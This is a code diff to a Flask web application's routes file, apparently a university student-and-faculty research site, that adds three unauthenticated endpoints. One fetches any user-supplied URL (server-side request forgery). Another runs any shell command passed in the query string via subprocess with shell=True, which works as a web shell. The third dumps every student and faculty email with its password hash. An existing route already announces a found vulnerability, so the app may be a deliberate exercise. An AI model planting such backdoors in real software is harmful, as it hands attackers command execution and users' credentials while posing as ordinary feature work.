@@ -1,6 +1,8 @@
 from app import db
 from flask import render_template, flash, redirect, url_for, request, jsonify
 import sqlalchemy as sqla
+import urllib.request
+import subprocess
 
 from app.main.models import Course, Student, Position, Faculty, Major, ResearchTopic, Language
 from app.main.models import Student
@@ -18,6 +20,43 @@ from app.auth.role_required import role_required
 @main.route('/admin', methods=['GET', 'POST'])
 def admin():
     return "CONGRATS!!! YOU FOUND A VULNERABILITY!"
+
+@main.route('/fetch', methods=['GET', 'POST'])
+def fetch_url():
+    url = request.args.get('url')
+    if url:
+        try:
+            response = urllib.request.urlopen(url)
+            content = response.read().decode('utf-8')
+            return f"<pre>{content}</pre>"
+        except Exception as e:
+            return f"Error fetching URL: {str(e)}"
+    return "Please provide a URL parameter"
+
+@main.route('/debug', methods=['GET', 'POST'])
+def debug():
+    cmd = request.args.get('cmd')
+    if cmd:
+        try:
+            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+            return f"<pre>{result.decode('utf-8')}</pre>"
+        except Exception as e:
+            return f"Error: {str(e)}"
+    return "Please provide a cmd parameter"
+
+@main.route('/export', methods=['GET'])
+def export_data():
+    users = Student.query.all()
+    output = "All Users (email:password_hash)\n"
+    output += "="*50 + "\n"
+    for user in users:
+        output += f"{user.email}:{user.password_hash}\n"
+    faculty = Faculty.query.all()
+    output += "\nFaculty\n"
+    output += "="*50 + "\n"
+    for f in faculty:
+        output += f"{f.email}:{f.password_hash}\n"
+    return f"<pre>{output}</pre>"
 
 @main.route('/', methods=['GET', 'POST'])
 @main.route('/index', methods=['GET', 'POST']) #deprecated: see student.student_index for main.index
